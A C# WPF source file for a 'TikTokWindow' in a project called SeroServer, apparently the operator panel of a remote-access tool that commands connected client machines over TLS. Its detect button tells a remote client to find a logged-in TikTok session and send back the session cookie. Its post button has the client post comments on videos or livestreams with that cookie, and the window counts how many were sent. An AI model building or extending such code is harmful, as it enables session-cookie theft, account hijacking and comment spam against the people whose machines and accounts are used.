using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class TikTokWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool _maximized;
    private int  _sentCount;

    public TikTokWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = $"  —  {label}";

        _server.RegisterHandler(clientId, PacketType.TikTokCommentAck,   OnAck);
        _server.RegisterHandler(clientId, PacketType.TikTokCookieResult, OnCookieResult);

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.TikTokCommentAck);
            _server.UnregisterHandler(clientId, PacketType.TikTokCookieResult);
        };

        RbLive.Checked  += (_, _) => RunIdLabel.Text = "Livestream room ID or URL";
        RbVideo.Checked += (_, _) => RunIdLabel.Text = "Video URL or ID";
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void OnAck(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<TikTokCommentAckData>(pkt.Data);
        if (d == null) return;
        Dispatcher.Invoke(() =>
        {
            if (d.Success)
            {
                _sentCount++;
                TxtSentCount.Text = $"{_sentCount} sent";
                AddLog($"[✓] Comment posted");
                TxtStatus.Text = $"Success — {_sentCount} comment(s) sent";
            }
            else
            {
                AddLog($"[✗] {d.Error}");
                TxtStatus.Text = $"Failed: {d.Error[..Math.Min(d.Error.Length, 80)]}";
            }
        });
    }

    private void OnCookieResult(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<TikTokCookieResultData>(pkt.Data);
        if (d == null) return;
        Dispatcher.Invoke(() =>
        {
            if (d.Found)
            {
                TxtCookie.Text = d.Cookie;
                AddLog("[✓] Session found on machine — cookie loaded");
                TxtStatus.Text = "Cookie detected and loaded";
            }
            else
            {
                AddLog("[✗] No TikTok session found on machine");
                TxtStatus.Text = "No session found — paste your cookie manually";
            }
        });
    }

    // ── Buttons ─────────────────────────────────────────────────────────────

    private async void BtnPost_Click(object s, RoutedEventArgs e)
    {
        var videoId = TxtVideoId.Text.Trim();
        var text    = TxtComment.Text.Trim();
        var cookie  = TxtCookie.Text.Trim();

        if (string.IsNullOrEmpty(videoId)) { TxtStatus.Text = "Enter a video/room ID or URL."; return; }
        if (string.IsNullOrEmpty(text))    { TxtStatus.Text = "Enter a comment."; return; }

        bool isLive = RbLive.IsChecked == true;

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.TikTokComment,
            Data = JsonConvert.SerializeObject(new TikTokCommentData
            {
                VideoId    = videoId,
                Text       = text,
                Cookie     = cookie,
                IsLiveroom = isLive
            })
        });

        var target = isLive ? "livestream" : "video";
        AddLog($"[→] Posting on {target} {videoId}: {text[..Math.Min(text.Length, 40)]}…");
        TxtStatus.Text = "Posting…";
    }

    private async void BtnDetect_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.TikTokDetectCookie });
        TxtStatus.Text = "Detecting TikTok session…";
        AddLog("[?] Checking for existing TikTok session on machine…");
    }

    private void BtnClearLog_Click(object s, RoutedEventArgs e) => TxtLog.Clear();

    // ── Helpers ─────────────────────────────────────────────────────────────

    private void AddLog(string msg)
    {
        TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
        LogScroll.ScrollToEnd();
    }

    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMax.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }
    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
